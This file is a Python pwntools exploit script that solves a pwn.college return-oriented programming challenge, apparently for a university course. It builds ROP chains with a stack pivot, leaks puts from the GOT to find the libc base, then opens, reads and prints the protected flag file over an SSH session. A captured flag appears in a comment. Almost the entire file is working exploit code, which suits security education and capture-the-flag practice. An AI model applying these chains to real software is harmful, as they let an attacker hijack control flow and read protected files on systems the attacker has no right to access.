#!/usr/bin/env python3
#pwn_college{4CWGabuaULvOg9t8lKicypJIIDs.dBzNywCN2gzW}
#python3 solution.py


from pwn import *

local = False
#local = True

context.arch = 'amd64'
elf = context.binary = ELF('./babyrop_level9_testing1')
libc = ELF('libc.so.6')

if local:
    p = elf.process()
    raw_input("attach gdb")
else:
    s = ssh(user="cse466", host="cse466.pwn.college", keyfile="/home/kali/.ssh/pwncollege-pwntool")
    p = s.process("./babyrop_level9_testing1")

rop = ROP(elf)
rop.raw(0x000000000040203d) #pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
rop.raw(0x405090) #address where to pivot the rsp, this is for pop rsp
rop.raw(0x0000000000000000) #bogus for r13
rop.raw(0x0000000000000000) #bogus for r14
rop.raw(0x0000000000000000) #bogus for r15

#increasing the gap between rsp and got table
#calling ret multiple times will keep increasing rsp by one and hence the distance from got
for i in range(0,400):
    rop.raw(0x000000000040101a)


rop.call("puts", [elf.got.puts])

#Due to invalid value in rsi the crash was occuring in printf while re-executing the main(), these instructions are just to avoid that crash
rop.raw(0x0000000000402041) #pop rsi ; pop r15 ; ret (address in PIE disabled binary)
rop.raw(0x0000000000405018) #value that will be pop'ed in rsi, this is some random value found in GOT section to satisfy the printf criteria, take the static value from puts@glibc in puts@plt
rop.raw(0x0000000000000000) #bogus value that will be pop'ed in r15

rop.call("main")
payload = rop.chain()
print(rop.dump())

p.recvuntil("\n###\n")
p.sendline(payload)
p.recvuntil("Exiting!\n")
puts = p.recvline()
p.recvuntil("\n###\n")

puts = puts.rstrip()
puts = u64(puts.ljust(8, b"\x00"))
print("puts address in GOT in binary: ", hex(puts))
print("static address of puts in libc: ", hex(libc.sym.puts))

libc_base = puts - libc.sym.puts
libc.address = libc_base
print("libc loaded at: ", hex(libc.address))

data_section = 0x405500 # known memory address in data section where flag's filename and later flag content will get copied


rop = ROP(libc)

rop.raw(0x000000000040203d) #pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
rop.raw(0x405090) #address where to pivot the rsp, this is for pop rsp
rop.raw(0x0000000000000000) #bogus for r13
rop.raw(0x0000000000000000) #bogus for r14
rop.raw(0x0000000000000000) #bogus for r15
rop.call("read", [0x00, data_section, 0x08])
rop.call("open", [data_section, 0x00, 0x00])
rop.call("read", [0x03, data_section, 0x40])
rop.call("puts", [data_section])

payload = rop.chain()
print(rop.dump())

p.sendline(payload)

flag_path = b'flag\x00\x00\x00\x00'
p.sendline(flag_path) # input 'flag' as a filename to store in known location in data_section

p.interactive()

